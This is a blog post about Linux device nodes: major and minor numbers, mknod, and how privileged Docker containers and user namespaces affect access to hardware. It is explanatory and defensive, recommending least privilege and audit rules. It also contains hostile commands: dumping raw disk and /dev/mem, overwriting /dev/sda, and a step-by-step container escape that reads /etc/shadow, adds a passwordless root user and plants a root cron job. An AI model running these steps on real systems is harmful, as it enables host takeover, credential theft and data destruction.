---
title: "Device Nodes: Linux's Gateway to Hardware"
date: 2026-01-05T00:00:00Z
draft: false
tags: ['linux', 'kernel', 'devices', 'security', 'containers', 'devops']
---

Everything is a file in Unix/Linux—including hardware. Device nodes are the special files that provide user-space programs access to kernel drivers and hardware devices. Understanding device nodes is crucial for system administration, container security, and low-level debugging.

## What Are Device Nodes?

Device nodes are special files that act as interfaces between user-space applications and kernel device drivers. They live in `/dev/` and allow programs to communicate with hardware through standard file operations like `read()`, `write()`, and `ioctl()`.

```bash
$ ls -l /dev/sda /dev/null /dev/random
brw-rw---- 1 root disk    8, 0 Jan 10 10:00 /dev/sda
crw-rw-rw- 1 root root    1, 3 Jan 10 10:00 /dev/null
crw-rw-rw- 1 root root    1, 8 Jan 10 10:00 /dev/random
```

Notice the first character:
- `b` = Block device (reads/writes in blocks)
- `c` = Character device (reads/writes character by character)

## The Anatomy of a Device Node

A device node contains crucial metadata:

```
crw-rw-rw- 1 root root 1, 3 Jan 10 10:00 /dev/null
│││ │  │   │ │    │    │  │
│││ │  │   │ │    │    │  └─ Minor number
│││ │  │   │ │    │    └──── Major number
│││ │  │   │ │    └─────────── Group
│││ │  │   │ └──────────────── Owner
│││ │  │   └─────────────────── Link count
│││ │  └─────────────────────── Group permissions
│││ └────────────────────────── Owner permissions  
││└──────────────────────────── Other permissions
│└───────────────────────────── File type (c=char, b=block)
└────────────────────────────── Special file flag
```

### Major and Minor Numbers

The **major number** identifies the device driver:
- Major 8 = SCSI disk driver
- Major 1 = Memory devices driver
- Major 4 = TTY devices driver

The **minor number** identifies the specific device instance:
- `/dev/sda` (8, 0) = First SCSI disk
- `/dev/sda1` (8, 1) = First partition on first SCSI disk
- `/dev/sdb` (8, 16) = Second SCSI disk

When you read from a device node, the kernel routes the request to the driver registered for that major number, passing the minor number to identify which specific device.

## Creating Device Nodes

Device nodes are typically created automatically by `udev`, but you can create them manually with `mknod`:

```bash
# Create a character device node
sudo mknod /dev/mydevice c 250 0
#              │         │  │   │
#              │         │  │   └─ Minor number
#              │         │  └───── Major number  
#              │         └──────── Type (c=char, b=block)
#              └────────────────── Path

# Create a block device node
sudo mknod /dev/myblock b 251 0
```

**Important:** Creating the device node doesn't create the device or driver—it just creates the interface. The kernel must have a driver registered for that major number.

## Common Device Nodes

### Character Devices

```bash
/dev/null     # Data sink (discards all writes)
/dev/zero     # Infinite stream of null bytes
/dev/random   # Cryptographically secure random numbers
/dev/urandom  # Fast random numbers (less secure)
/dev/tty      # Current terminal
/dev/pts/*    # Pseudo-terminal slaves
```

### Block Devices

```bash
/dev/sda      # First SCSI/SATA disk
/dev/nvme0n1  # First NVMe disk
/dev/loop0    # Loopback device
/dev/mapper/* # Device mapper (LVM, encryption)
```

### Special Devices

```bash
/dev/stdin    # Standard input (symlink to /proc/self/fd/0)
/dev/stdout   # Standard output (symlink to /proc/self/fd/1)
/dev/stderr   # Standard error (symlink to /proc/self/fd/2)
```

## Security Implications

Device nodes are powerful and dangerous. Access to certain device nodes can lead to:

### Full System Compromise

```bash
# Reading raw disk bypasses filesystem permissions
sudo dd if=/dev/sda of=/tmp/disk_image bs=1M

# This captures:
# - All files (including /etc/shadow)
# - Deleted files still on disk
# - Encryption keys in memory (if in swap)
```

### Memory Access

```bash
# /dev/mem provides direct physical memory access
sudo dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null | strings
# Can read kernel memory, passwords, encryption keys
```

### Kernel Manipulation

```bash
# /dev/kmem allows reading/writing kernel virtual memory
# Can be used to inject code into the kernel
```

## Device Nodes in Containers

This is where device nodes become critical for container security.

### Default Docker Behavior

Docker creates a minimal `/dev/` in containers:

```bash
$ docker run --rm alpine ls -la /dev
total 4
drwxr-xr-x    5 root     root           340 Jan 10 10:00 .
drwxr-xr-x    1 root     root          4096 Jan 10 10:00 ..
crw--w----    1 root     tty       136,  0 Jan 10 10:00 console
lrwxrwxrwx    1 root     root            11 Jan 10 10:00 core -> /proc/kcore
lrwxrwxrwx    1 root     root            13 Jan 10 10:00 fd -> /proc/self/fd
crw-rw-rw-    1 root     root        1,  7 Jan 10 10:00 full
crw-rw-rw-    1 root     root        1,  3 Jan 10 10:00 null
lrwxrwxrwx    1 root     root             8 Jan 10 10:00 ptmx -> pts/ptmx
crw-rw-rw-    1 root     root        1,  8 Jan 10 10:00 random
crw-rw-rw-    1 root     root        1,  9 Jan 10 10:00 urandom
crw-rw-rw-    1 root     root        1,  5 Jan 10 10:00 zero
```

Notice what's missing: **No disk devices, no memory devices, no kernel devices.**

### The Privileged Container Danger

Running with `--privileged` mounts **ALL** host device nodes:

```bash
$ docker run --privileged --rm alpine ls -la /dev/sd* /dev/mem
brw-rw----    1 root     disk        8,  0 Jan 10 10:00 /dev/sda
brw-rw----    1 root     disk        8,  1 Jan 10 10:00 /dev/sda1
crw-r-----    1 root     kmem        1,  1 Jan 10 10:00 /dev/mem
```

Now the container can:

```bash
# Read host's raw disk
dd if=/dev/sda of=/tmp/host_disk bs=1M

# Read host's memory
dd if=/dev/mem bs=1k count=1024 2>/dev/null | strings

# Write to host's disk (corruption/rootkit)
echo "malicious data" > /dev/sda
```

**Privileged containers are essentially root on the host.**

### Selective Device Exposure

You can expose specific devices safely:

```bash
# Give container access to GPU
docker run --device=/dev/nvidia0 tensorflow-gpu

# Give container access to USB device
docker run --device=/dev/bus/usb/001/002 usb-app

# Give container access to video device
docker run --device=/dev/video0 webcam-app
```

The `--device` flag:
1. Creates the device node in the container's `/dev/`
2. Grants the container's cgroup permission to access it
3. Maintains isolation for all other devices

## Device Nodes and User Namespaces

Even if a container creates a device node, user namespaces provide protection:

```bash
# Inside unprivileged container
mknod /tmp/sda b 8 0  # Succeeds!
dd if=/tmp/sda of=/tmp/disk bs=1M  # Fails!
```

Why does it fail?

```
1. mknod creates the device node file (just metadata)
2. Container process is UID 0 in container, UID 100000 on host
3. When opening /tmp/sda, kernel checks:
   - Real device /dev/sda permissions: root:disk (0:6)
   - Process host UID: 100000
   - Access denied: UID 100000 cannot access device (8,0)
```

User namespaces ensure that even if device nodes are created, access to the underlying hardware is still controlled by host-level permissions.

## Device Node Permissions Best Practices

### 1. Minimize Device Exposure

Only expose devices that containers actually need:

```bash
# Bad: Full privileged access
docker run --privileged myapp

# Good: Specific device access
docker run --device=/dev/dri myapp  # GPU only
```

### 2. Use Read-Only Devices When Possible

```bash
docker run --device=/dev/sda:/dev/sda:r backup-app
                                        │
                                        └─ Read-only mode
```

### 3. Audit Device Node Creation

Monitor for suspicious `mknod` calls:

```bash
# Using auditd
auditctl -a always,exit -F arch=b64 -S mknod -S mknodat

# Check logs
ausearch -sc mknod
```

### 4. Restrict /dev/ Permissions

On the host, ensure device nodes have appropriate permissions:

```bash
# Bad: World-readable raw disk
crw-rw-rw- 1 root root 8, 0 Jan 10 10:00 /dev/sda

# Good: Only disk group
brw-rw---- 1 root disk 8, 0 Jan 10 10:00 /dev/sda
```

## Real-World Attack Example

Here's how an attacker might exploit device nodes:

```bash
# Step 1: Escape to privileged container or find misconfigured system
docker run --privileged -it alpine sh

# Step 2: Create device node for host's disk
mknod /dev/host-disk b 8 0

# Step 3: Mount host's root filesystem
mkdir /host
mount /dev/host-disk /host

# Step 4: Access host's filesystem
cat /host/etc/shadow  # Read password hashes
echo "attacker::0:0::/root:/bin/bash" >> /host/etc/passwd  # Add user

# Step 5: Persistence
echo "* * * * * /evil_script.sh" >> /host/var/spool/cron/crontabs/root
```

This is why `--privileged` should be avoided in production.

## Conclusion

Device nodes are the bridge between user-space applications and kernel drivers. They're powerful tools for system administration and debugging, but also potential security vulnerabilities if not properly controlled.

Key takeaways:

- Device nodes are special files with major/minor numbers that route requests to kernel drivers
- Containers should have minimal device node access by default
- Privileged containers with full `/dev/` access are essentially root on the host
- User namespaces provide an additional layer of protection against device node exploits
- Always use principle of least privilege when exposing devices to containers

## Further Reading

- [Device Nodes Documentation](https://www.kernel.org/doc/html/latest/admin-guide/devices.html)
- [Linux Device Drivers (LDD3)](https://lwn.net/Kernel/LDD3/)
- [Container Device Access](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)
- [udev Device Management](https://www.kernel.org/pub/linux/utils/kernel/hotplug/udev/udev.html)
